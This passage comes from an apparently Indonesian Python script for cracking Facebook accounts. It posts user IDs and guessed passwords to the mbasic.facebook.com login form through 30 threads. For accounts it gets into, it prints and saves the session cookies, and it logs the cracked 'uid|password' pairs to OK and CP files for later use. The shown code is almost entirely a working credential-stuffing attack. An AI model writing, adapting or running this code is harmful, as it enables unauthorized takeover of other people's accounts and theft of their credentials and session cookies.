				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
				b = parser(p,"html.parser")
				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
				for i in b("input"):
					try:
						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
						else:continue
					except:pass
				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r\033[0;92m[RAKA_AMANDA] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue

			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
        print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Copy Paste Hasil Crack Dan Simpan Selama \033[1;92m3 \033[1;97mHari")
	exit("\n\n # [>Program Close<]")

def aa_raka():
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m1\033[1;96m]\033[1;97m Masukan User-Agent")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m2\033[1;96m]\033[1;97m Default User-Agent")
	raka = raw_input("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Choose : \033[1;92m")
	if raka =="":
		menu()
	elif raka == "1":
		c_raka = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Enter User-Agent : ")
		open(".raka", "w").write(c_raka)
		time.sleep(1)
		raw_input("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Press Enter To Save User-Agent")
		menu()
	elif raka == "2":
		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .raka")
		time.sleep(1)
		raw_input("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m User-Agent Save Successfully...\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Returen...")
		menu()

def raka_andrian():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	raka_andrian()
	login()
